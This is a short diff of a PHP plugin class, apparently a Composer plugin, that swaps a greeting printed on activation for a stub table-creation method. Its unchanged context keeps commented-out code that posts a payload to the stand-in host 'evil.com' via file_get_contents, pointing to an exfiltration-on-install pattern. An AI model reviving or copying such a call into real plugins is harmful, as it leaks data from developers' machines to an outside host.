@@ -43,7 +43,9 @@ class Plugin implements PluginInterface
         //     ],
         // ]);
         // @file_get_contents("http://evil.com", false, $context);
-        print "Heey Ren!";
+        $this->createTable();
+
+        print_r("Activated.");
     }
     /**
      * @param string $type
@@ -65,4 +67,9 @@ class Plugin implements PluginInterface
     //     }
     //     return $payload;
     // }
+
+    private function createTable()
+    {
+      print_r("create table here...");
+    }
 }
